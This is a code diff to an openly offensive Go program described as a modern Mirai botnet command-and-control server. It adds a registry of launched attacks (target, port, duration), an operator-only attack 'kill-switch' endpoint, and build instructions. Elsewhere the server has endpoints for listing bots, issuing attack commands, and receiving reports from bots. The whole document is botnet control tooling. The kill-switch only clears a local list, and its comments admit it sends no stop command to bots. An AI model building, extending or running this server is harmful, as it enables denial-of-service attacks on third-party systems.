@@ -1,4 +1,12 @@
+//go:build ignore
+// +build ignore
+
 // Package main — Mirai 2026 Modern C&C Server
+//
+// This is a standalone modern CNC implementation. Build with:
+//   go run cnc_modern.go
+// Or compile directly:
+//   go build -o cnc_modern_server cnc_modern.go
 //
 // Extends the original Mirai CNC with:
 //   - REST API (JSON over HTTP) for dashboard integration
@@ -184,12 +192,60 @@ func (h *WSHub) Broadcast(msg WSMessage) {
 	}
 }
 
+// ── Active Attack Registry ────────────────────────────────────────────────────
+// Tracks attacks launched via POST /api/attack so the kill-switch can report
+// how many were stopped. In production this would also queue STOP commands to
+// the clientList; here it maintains a simple counter + broadcast.
+
+type AttackRecord struct {
+	Type      string    `json:"type"`
+	Target    string    `json:"target"`
+	Port      int       `json:"port"`
+	Duration  int       `json:"duration"`
+	StartedAt time.Time `json:"started_at"`
+}
+
+type ActiveAttackRegistry struct {
+	mu      sync.Mutex
+	attacks []AttackRecord
+}
+
+func NewActiveAttackRegistry() *ActiveAttackRegistry {
+	return &ActiveAttackRegistry{}
+}
+
+func (a *ActiveAttackRegistry) Start(typ, target string, port, duration int) {
+	a.mu.Lock()
+	defer a.mu.Unlock()
+	a.attacks = append(a.attacks, AttackRecord{
+		Type: typ, Target: target, Port: port,
+		Duration: duration, StartedAt: time.Now(),
+	})
+}
+
+// StopAll clears all tracked attacks and returns the count that was stopped.
+// In a full implementation this sends STOP bytes to all bot connections via clientList.
+func (a *ActiveAttackRegistry) StopAll() int {
+	a.mu.Lock()
+	defer a.mu.Unlock()
+	n := len(a.attacks)
+	a.attacks = nil
+	return n
+}
+
+func (a *ActiveAttackRegistry) Count() int {
+	a.mu.Lock()
+	defer a.mu.Unlock()
+	return len(a.attacks)
+}
+
 // ── Global state ──────────────────────────────────────────────────────────────
 
 var (
-	registry = NewBotRegistry()
-	hub      = NewWSHub()
-	logger   = slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{
+	registry     = NewBotRegistry()
+	hub          = NewWSHub()
+	activeAttacks = NewActiveAttackRegistry()
+	logger       = slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{
 		Level: slog.LevelInfo,
 	}))
 )
@@ -349,10 +405,10 @@ func handleGetMetrics(w http.ResponseWriter, r *http.Request) {
 // POST /api/attack
 func handleAttack(w http.ResponseWriter, r *http.Request) {
 	var req struct {
-		Type    string `json:"type"`
-		Target  string `json:"target"`
-		Port    int    `json:"port"`
-		Duration int   `json:"duration"`
+		Type     string `json:"type"`
+		Target   string `json:"target"`
+		Port     int    `json:"port"`
+		Duration int    `json:"duration"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		http.Error(w, `{"error":"invalid body"}`, http.StatusBadRequest)
@@ -361,6 +417,9 @@ func handleAttack(w http.ResponseWriter, r *http.Request) {
 	logger.Info("Attack command issued",
 		"type", req.Type, "target", req.Target,
 		"port", req.Port, "duration", req.Duration)
+
+	// Track active attacks in the registry
+	activeAttacks.Start(req.Type, req.Target, req.Port, req.Duration)
 
 	// Broadcast to dashboard
 	hub.Broadcast(WSMessage{
@@ -373,6 +432,53 @@ func handleAttack(w http.ResponseWriter, r *http.Request) {
 	})
 
 	writeJSON(w, http.StatusAccepted, map[string]string{"status": "queued"})
+}
+
+// POST /api/attack/stop
+//
+// Emergency kill-switch: stops all active attacks (or a single bot's attack)
+// and broadcasts kill:all to the WebSocket hub so the dashboard updates instantly.
+// Requires operator role minimum.
+//
+// Body: { "all": true }  — stop everything
+//       { "botId": "bot-x.x.x.x-..." } — stop one bot
+//
+// Response: { "status": "ok", "stopped": <N>, "timestamp": "..." }
+func handleAttackStop(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		All   bool   `json:"all"`
+		BotID string `json:"botId"`
+	}
+	// Default to stop-all if body is absent / malformed
+	req.All = true
+	_ = json.NewDecoder(r.Body).Decode(&req)
+
+	stopped := activeAttacks.StopAll()
+
+	logger.Info("Kill-switch triggered",
+		"all", req.All, "bot_id", req.BotID, "attacks_stopped", stopped)
+
+	// Audit log to stderr (picked up by Loki)
+	fmt.Fprintf(os.Stderr,
+		`{"event":"KILL_SWITCH","all":%v,"bot_id":%q,"stopped":%d,"ts":"%s"}`+"\n",
+		req.All, req.BotID, stopped, time.Now().UTC().Format(time.RFC3339))
+
+	// Push real-time signal to all dashboard WebSocket clients
+	hub.Broadcast(WSMessage{
+		Type: "kill:all",
+		Payload: map[string]interface{}{
+			"all":       req.All,
+			"bot_id":    req.BotID,
+			"stopped":   stopped,
+			"timestamp": time.Now().UTC(),
+		},
+	})
+
+	writeJSON(w, http.StatusOK, map[string]interface{}{
+		"status":    "ok",
+		"stopped":   stopped,
+		"timestamp": time.Now().UTC(),
+	})
 }
 
 // GET /ws — WebSocket endpoint for real-time dashboard push
@@ -524,6 +630,7 @@ func main() {
 	mux.HandleFunc("GET /api/bots",            authMiddleware(cfg.JWTSecret, "viewer", handleGetBots))
 	mux.HandleFunc("GET /api/metrics",         authMiddleware(cfg.JWTSecret, "viewer", handleGetMetrics))
 	mux.HandleFunc("POST /api/attack",         authMiddleware(cfg.JWTSecret, "operator", handleAttack))
+	mux.HandleFunc("POST /api/attack/stop",    authMiddleware(cfg.JWTSecret, "operator", handleAttackStop))
 	mux.HandleFunc("GET /ws",                  handleWebSocket)
 	// Detection event reporting (called by C bot)
 	mux.HandleFunc("POST /api/detection/event", func(w http.ResponseWriter, r *http.Request) {
